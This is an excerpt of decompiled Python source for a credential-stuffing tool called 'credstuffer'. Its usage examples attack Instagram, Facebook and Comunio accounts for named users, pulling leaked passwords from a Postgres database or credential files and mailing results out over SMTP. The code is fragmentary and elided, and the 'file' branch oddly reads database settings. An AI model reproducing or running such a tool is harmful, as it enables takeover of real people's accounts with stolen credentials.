...
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/credstuffer/app.py
# Compiled at: 2020-04-05 08:14:43
# Size of source mod 2**32: 8033 bytes
...
class Credstuffer:
    __doc__ = ' class Credstuffer\n\n    USAGE:\n            credstuffer = Credstuffer()\n\n    '

    def __init__(self, account, usernames, max_requests=1000000, notify='mail', filepath=None, dirpath=None, schemas=None, tables=None, **params):
        ...
        self.accounts = list()
        account_instance = (self.create_instance)(account=self.account, max_requests=self.max_requests, notify=self.notify, **self.mailparams)
...
def main():
    usage1 = 'credstuffer instagram --usernames "John, Jane" database --host 192.168.1.2 --port 5432 --user john --password test1234 --dbname postgres'
    usage2 = 'credstuffer facebook --usernames "John, Jane" file --path /home/john/credentials.txt'
    usage3 = 'credstuffer comunio --usernames "John, Jane" --Nsmtp smtp.web.de --Nport 587 --Nsender john@web.de --Nreceiver jane@web.de --Npassword johnjane file --dir /opt/collections/'
    ...
    params.setdefault('mail', {'smtp':nsmtp,  'port':nport,  'sender':nsender,  'receiver':nreceiver,  'password':npassword})
    ...
    if args.subcommand == 'file':
        ...
        dbname = args.dbname
        params.setdefault('database', {'host':host,  'port':port,  'username':username,  'password':password,  'dbname':dbname})
        schemas = args.schemas
        tables = args.tables
        credstuffer = Credstuffer(account=args.account, usernames=account_usernames, schemas=schemas, tables=tables, **params)
    credstuffer.run()
